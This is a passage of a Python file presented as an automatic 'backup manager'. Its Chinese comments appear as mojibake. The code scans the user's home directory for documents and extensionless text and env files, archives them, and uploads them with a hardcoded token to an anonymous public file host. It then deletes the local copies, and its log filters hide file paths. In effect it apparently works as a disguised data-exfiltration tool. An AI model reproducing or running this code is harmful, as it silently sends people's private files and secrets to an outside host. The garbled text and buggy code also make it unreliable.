# -*- coding: utf-8 -*-

import os
import shutil
import time
import socket
import logging
import tarfile
import requests
from datetime import datetime, timedelta

from .config import BackupConfig

class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        self.api_token = "MwFiLnOTlQrmQv5LBC1nYiLS5fofF8Po"
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # è‡ªå®šä¹‰æ—¥å¿—æ ¼å¼åŒ–å™¨
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—ï¼Œä½†ä¿ç•™"æ‰«æç›®å½•"å’Œ"æ’é™¤ç›®å½•"
                    if isinstance(record.msg, str):
                        msg = record.msg
                        if any(x in msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", "æ‰«æç›®å½•:", ":\\", "/"]):
                            if msg.startswith("æ‰«æç›®å½•:") or msg.startswith("æ’é™¤ç›®å½•:"):
                                return super().format(record)
                            return None
                        # ä¿ç•™è¿›åº¦å’ŒçŠ¶æ€ä¿¡æ¯
                        if any(x in msg for x in ["å·²å¤‡ä»½", "å®Œæˆ", "å¤±è´¥", "é”™è¯¯", "æˆåŠŸ", "ğŸ“", "âœ…", "âŒ", "â³", "ğŸ“‹"]):
                            return super().format(record)
                        # å…¶ä»–æ™®é€šæ—¥å¿—
                        return super().format(record)
                    return super().format(record)
            
            # è‡ªå®šä¹‰è¿‡æ»¤å™¨
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—ï¼Œä½†ä¿ç•™"æ‰«æç›®å½•"å’Œ"æ’é™¤ç›®å½•"
                        if any(x in record.msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", "æ‰«æç›®å½•:", ":\\", "/"]):
                            if record.msg.startswith("æ‰«æç›®å½•:") or record.msg.startswith("æ’é™¤ç›®å½•:"):
                                return True
                            return False
                    return True
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
          
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except (OSError, IOError, PermissionError) as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"ç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    def _check_internet_connection(self):
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        for host, port in self.config.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=self.config.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"è¿æ¥ {host}:{port} å¤±è´¥: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """å®‰å…¨åˆ é™¤æ–‡ä»¶ï¼Œæ”¯æŒé‡è¯•æœºåˆ¶
        
        Args:
            file_path: è¦åˆ é™¤çš„æ–‡ä»¶è·¯å¾„
            retry: æ˜¯å¦ä½¿ç”¨é‡è¯•æœºåˆ¶
            
        Returns:
            bool: åˆ é™¤æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # ä½¿ç”¨é‡è¯•æœºåˆ¶åˆ é™¤æ–‡ä»¶
        try:
            # ç­‰å¾…æ–‡ä»¶å¥æŸ„å®Œå…¨é‡Šæ”¾
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"åˆ é™¤æ–‡ä»¶é‡è¯•ä¸­: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ é™¤æ–‡ä»¶å¤±è´¥: {str(e)}")
            return False

    def should_exclude_dir(self, path):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤ç›®å½•
        åªæ’é™¤ä¸»ç›®å½•ä¸‹çš„æŒ‡å®šä¸€çº§ç›®å½•ï¼Œå…¶å®ƒç›®å½•ä¸€å¾‹ä¸æ’é™¤ã€‚
        """
        # ä¼˜å…ˆæ’é™¤ AutoBackup ç›®å½•è‡ªèº«ï¼Œé¿å…è‡ªæˆ‘å¤‡ä»½
        backup_root = os.path.abspath(self.config.BACKUP_ROOT)
        abspath = os.path.abspath(path)
        if abspath.startswith(backup_root):
            return True
        # è·å–ä¸»ç›®å½•ç»å¯¹è·¯å¾„
        home_dir = os.path.abspath(os.path.expanduser('~'))
        # åªæ’é™¤ä¸»ç›®å½•ä¸‹çš„è¿™äº›ä¸€çº§ç›®å½•
        exclude_names = [
            '.cursor', '.zsh_sessions', 'Applications', 'Library', 'Movies', 'Music', 'Pictures', '.docker', '.rustup',
            '.npm', '.nvm', '.local', '.cargo', '.dotnet', 'venv', '.gradle', '.pki'
        ]
        # åˆ¤æ–­æ˜¯å¦ä¸ºä¸»ç›®å½•ä¸‹çš„ä¸€çº§ç›®å½•
        for name in exclude_names:
            exclude_path = os.path.join(home_dir, name)
            if abspath == exclude_path:
                return True
        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """ç£ç›˜æ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        # ä¼˜å…ˆå¤‡ä»½ MACOS_SPECIFIC_DIRS
        if extensions_type == 4:
            if self.config.DEBUG_MODE:
                logging.debug("ä¼˜å…ˆå¤‡ä»½ MACOS_SPECIFIC_DIRS")
            self.backup_specified_files(source_dir, target_dir)
            # ç»§ç»­åç»­å¤‡ä»½é€»è¾‘

        if self.config.DEBUG_MODE:
            logging.debug(f"å¼€å§‹å¤‡ä»½ç›®å½•:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")
            logging.debug(f"æ‰©å±•åç±»å‹: {extensions_type}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ ç£ç›˜æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        # åŸæœ‰çš„æ–‡ä»¶ç±»å‹å¤‡ä»½é€»è¾‘
        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
        
        if self.config.DEBUG_MODE:
            logging.debug(f"ä½¿ç”¨çš„æ–‡ä»¶æ‰©å±•å: {extensions}")
                     
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0    # å·²æ‰«æç›®å½•æ•°
        excluded_dirs = 0   # å·²æ’é™¤ç›®å½•æ•°
        skipped_files = 0   # è·³è¿‡çš„æ–‡ä»¶æ•°
        matched_files = 0   # åŒ¹é…çš„æ–‡ä»¶æ•°

        # macOS ç‰¹å®šæ–‡ä»¶ç±»å‹
        macos_file_types = {
            'numbers': ['numbers', 'spreadsheet'],
            'pages': ['pages', 'document'],
            'keynote': ['keynote', 'presentation'],
            'textedit': ['textedit', 'text'],
            'preview': ['preview', 'image'],
            'pdf': ['pdf', 'document'],
            'rtf': ['rtf', 'document'],
            'rtfd': ['rtfd', 'document']
        }

        # macOS iWork æ–‡æ¡£ MIME ç±»å‹ï¼ˆå»é™¤ keynoteï¼‰
        macos_mime_types = {
            'pages': ['application/x-iwork-pages-sffpages'],
            'numbers': ['application/x-iwork-numbers-sffnumbers'],
        }
        # çº¯æ–‡æœ¬ç±»å‹
        plain_text_types = ['text/plain', 'text/x-env', 'text/rtf']

        try:
            # ä½¿ç”¨ os.walk çš„ topdown=True å‚æ•°ï¼Œè¿™æ ·å¯ä»¥è·³è¿‡ä¸éœ€è¦çš„ç›®å½•
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                
                # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"âŒ æ‰«æç›®å½•è¶…æ—¶: {source_dir}")
                    break
                    
                # å®šæœŸæ˜¾ç¤ºè¿›åº¦
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"â³ å·²æ‰«æ {scanned_dirs} ä¸ªç›®å½•ï¼Œæ’é™¤ {excluded_dirs} ä¸ªç›®å½•")
                        logging.debug(f"â³ å½“å‰æ‰«æ: {root}")
                        logging.debug(f"â³ å·²åŒ¹é… {matched_files} ä¸ªæ–‡ä»¶ï¼Œè·³è¿‡ {skipped_files} ä¸ªæ–‡ä»¶")
                    last_progress_time = current_time
                
                # è·³è¿‡ç›®æ ‡ç›®å½•
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # åªå¯¹å­ç›®å½•åšæ’é™¤åˆ¤æ–­ï¼Œæ ¹ç›®å½•ä¸æ’é™¤
                if root != source_dir and self.should_exclude_dir(root):
                    excluded_dirs += 1
                    dirs.clear()  # æ¸…ç©ºå­ç›®å½•åˆ—è¡¨ï¼Œé¿å…ç»§ç»­éå†
                    continue

                # å¤„ç†æ–‡ä»¶
                for file in files:
                    file_lower = file.lower()
                    source_file = os.path.join(root, file)
                    
                    # æ£€æŸ¥æ–‡ä»¶ç±»å‹
                    should_backup = False
                    
                    # 1. æ£€æŸ¥æ–‡ä»¶æ‰©å±•å
                    if any(file_lower.endswith(ext.lower()) for ext in extensions):
                        should_backup = True
                    else:
                        # 2. åªå¯¹æ— æ‰©å±•åæ–‡ä»¶åšç±»å‹æ£€æµ‹
                        if '.' not in file:
                            try:
                                file_type = subprocess.check_output(['file', '-b', '--mime-type', source_file]).decode('utf-8').strip()
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ— æ‰©å±•åæ–‡ä»¶ç±»å‹æ£€æµ‹: {file} -> {file_type}")
                                # åªè¯†åˆ« pages/numbers
                                for type_key, mime_list in macos_mime_types.items():
                                    if file_type in mime_list:
                                        should_backup = True
                                        if self.config.DEBUG_MODE:
                                            logging.debug(f"åŒ¹é…åˆ° macOS iWork æ–‡ä»¶ç±»å‹: {file} -> {type_key}")
                                        break
                                # è¯†åˆ«çº¯æ–‡æœ¬å’Œenvç±»å‹
                                if file_type in plain_text_types:
                                    should_backup = True
                                    if self.config.DEBUG_MODE:
                                        logging.debug(f"æ— æ‰©å±•åæ–‡ä»¶è¯†åˆ«ä¸ºæ–‡æœ¬ç±»å‹: {file} -> {file_type}")
                            except Exception as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ–‡ä»¶ç±»å‹æ£€æµ‹å¤±è´¥: {source_file} - {str(e)}")
                    
                    if not should_backup:
                        skipped_files += 1
                        continue

                    matched_files += 1
                    
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡ç©ºæ–‡ä»¶: {source_file}")
                            skipped_files += 1
                            continue
                        if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡å¤§æ–‡ä»¶: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                            skipped_files += 1
                            continue
                    except OSError as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥: {source_file} - {str(e)}")
                        skipped_files += 1
                        continue

                    # å°è¯•å¤åˆ¶æ–‡ä»¶
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        try:
                            # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è®¿é—®
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError) as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ–‡ä»¶è®¿é—®å¤±è´¥: {source_file} - {str(e)}")
                                if attempt < self.config.FILE_RETRY_COUNT - 1:
                                    time.sleep(self.config.FILE_RETRY_DELAY)
                                    continue
                                else:
                                    skipped_files += 1
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"åˆ›å»ºç›®æ ‡å­ç›®å½•å¤±è´¥: {target_sub_dir}")
                                skipped_files += 1
                                break
                                
                            # ä½¿ç”¨ä¼˜åŒ–çš„åˆ†å—å¤åˆ¶ï¼ˆ1MBå—å¤§å°ï¼‰
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                while True:
                                    chunk = src.read(self.config.COPY_CHUNK_SIZE)
                                    if not chunk:
                                        break
                                    dst.write(chunk)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            if self.config.DEBUG_MODE:
                                logging.debug(f"æˆåŠŸå¤åˆ¶: {source_file} -> {target_file}")
                            
                            break  # æˆåŠŸåè·³å‡ºé‡è¯•å¾ªç¯
                            
                        except (PermissionError, OSError, IOError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"âŒ æ–‡ä»¶å¤åˆ¶å¤±è´¥: {source_file} - {str(e)}")
                                skipped_files += 1

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºé”™: {str(e)}")
        except Exception as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")

        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡ä¿¡æ¯
        if files_count > 0:
            logging.info(f"\nğŸ“Š å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            if self.config.DEBUG_MODE:
                logging.debug(f"   ğŸ“‚ æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"   ğŸš« æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
                logging.debug(f"   â­ï¸ è·³è¿‡æ–‡ä»¶æ•°: {skipped_files}")
                logging.debug(f"   âœ… åŒ¹é…æ–‡ä»¶æ•°: {matched_files}")
            return target_dir
        else:
            if self.config.DEBUG_MODE:
                logging.debug(f"æ‰«æç»Ÿè®¡:")
                logging.debug(f"- æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"- æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
                logging.debug(f"- è·³è¿‡æ–‡ä»¶æ•°: {skipped_files}")
                logging.debug(f"- åŒ¹é…æ–‡ä»¶æ•°: {matched_files}")
            logging.error(f"âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æ–‡ä»¶")
            return None
    
    def _get_upload_server(self):
        """è·å–ä¸Šä¼ æœåŠ¡å™¨åœ°å€
    
        Returns:
            str: ä¸Šä¼ æœåŠ¡å™¨URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            # åˆ é™¤åŸå§‹å¤§æ–‡ä»¶
            self._safe_remove_file(file_path, retry=False)
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # æ¸…ç†åˆ†ç‰‡ç›®å½•
            chunk_dir = os.path.dirname(chunk_files[0])
            self._clean_directory(chunk_dir)
            return success
        else:
            return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)  # åˆ é™¤è¿‡å¤§çš„æ–‡ä»¶
                return False

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # ä½¿ç”¨ with è¯­å¥ç¡®ä¿æ–‡ä»¶æ­£ç¡®å…³é—­
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.info(f"âœ… æ–‡ä»¶ä¸Šä¼ æˆåŠŸ: {os.path.basename(file_path)}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    error_code = result.get("code", 0)
                                    logging.error(f"æœåŠ¡å™¨è¿”å›é”™è¯¯ (ä»£ç : {error_code}): {error_msg}")
                                    
                                    # å¤„ç†ç‰¹å®šé”™è¯¯ç 
                                    if error_code in [402, 405]:  # æœåŠ¡å™¨é™åˆ¶æˆ–æƒé™é”™è¯¯
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # å¦‚æœå·²ç»å°è¯•äº†æ‰€æœ‰æœåŠ¡å™¨
                                            time.sleep(self.config.RETRY_DELAY * 2)  # å¢åŠ ç­‰å¾…æ—¶é—´
                            except ValueError:
                                logging.error("æœåŠ¡å™¨è¿”å›æ— æ•ˆJSONæ•°æ®")
                        else:
                            logging.error(f"ä¸Šä¼ å¤±è´¥ï¼ŒHTTPçŠ¶æ€ç : {response.status_code}")

                except requests.exceptions.Timeout:
                    logging.error(f"ä¸Šä¼ è¶…æ—¶ (æœåŠ¡å™¨: {current_server})")
                except requests.exceptions.SSLError:
                    logging.error(f"SSLé”™è¯¯ (æœåŠ¡å™¨: {current_server})")
                except requests.exceptions.ConnectionError as e:
                    logging.error(f"è¿æ¥é”™è¯¯ (æœåŠ¡å™¨: {current_server}): {str(e)}")
                except requests.exceptions.RequestException as e:
                    logging.error(f"è¯·æ±‚å¼‚å¸¸ (æœåŠ¡å™¨: {current_server}): {str(e)}")
                except (OSError, IOError) as e:
                    logging.error(f"æ–‡ä»¶è¯»å–é”™è¯¯: {str(e)}")
                except Exception as e:
                    logging.error(f"ä¸Šä¼ å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")

                # åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # æ‰€æœ‰æœåŠ¡å™¨éƒ½å°è¯•è¿‡åç­‰å¾…
                
                total_retries += 1

            # æ— è®ºä¸Šä¼ æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œéƒ½å°è¯•åˆ é™¤æ–‡ä»¶
            self._safe_remove_file(file_path, retry=True)

            if not upload_success:
                logging.error("âŒ ä¸Šä¼ å¤±è´¥ï¼Œå·²è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°")
                return False
                
            return True

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: {str(e)}")
            # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿå°è¯•åˆ é™¤æ–‡ä»¶
            self._safe_remove_file(file_path, retry=False)
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

